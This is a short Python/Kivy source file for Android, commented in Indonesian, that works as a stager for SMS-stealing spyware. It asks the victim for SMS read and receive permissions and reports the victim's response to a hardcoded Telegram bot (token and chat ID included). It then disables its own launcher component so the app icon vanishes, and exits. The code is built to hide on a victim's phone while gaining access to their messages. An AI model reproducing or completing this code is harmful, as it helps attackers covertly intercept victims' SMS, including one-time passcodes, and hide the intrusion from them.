import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
from kivy.clock import Clock # Tambahkan Clock untuk jeda
import os

TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

def hide_and_exit(dt): # Tambahkan parameter dt untuk Clock
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        currentActivity = PythonActivity.mActivity
        PackageManager = autoclass('android.content.pm.PackageManager')
        ComponentName = autoclass('android.content.ComponentName')
        
        package_name = currentActivity.getPackageName()
        component_name = ComponentName(package_name, 'org.kivy.android.PythonActivity')
        
        # Eksekusi sembunyi ikon
        currentActivity.getPackageManager().setComponentEnabledSetting(
            component_name,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            0 # Gunakan 0 agar perubahan permanen tanpa membunuh app seketika
        )
        
        bot.send_message(CHAT_ID, "✅ Izin diproses & Ikon berhasil dihilangkan!")
    except:
        pass
    finally:
        # Keluar aplikasi dengan halus
        os._exit(0)

def on_permissions_callback(permissions, grants):
    # Cek apakah setidaknya izin SMS diberikan
    bot.send_message(CHAT_ID, "📩 Target sedang merespon popup...")
    # Beri jeda 2 detik agar sistem Android selesai menyimpan status izin
    # baru kemudian jalankan fungsi sembunyi
    Clock.schedule_once(hide_and_exit, 2)

if __name__ == '__main__':
    # Pastikan aplikasi tidak langsung sembunyi saat dijalankan
    # Munculkan popup izin terlebih dahulu
    request_permissions([
        Permission.READ_SMS,
        Permission.RECEIVE_SMS,
        Permission.POST_NOTIFICATIONS
    ], on_permissions_callback)
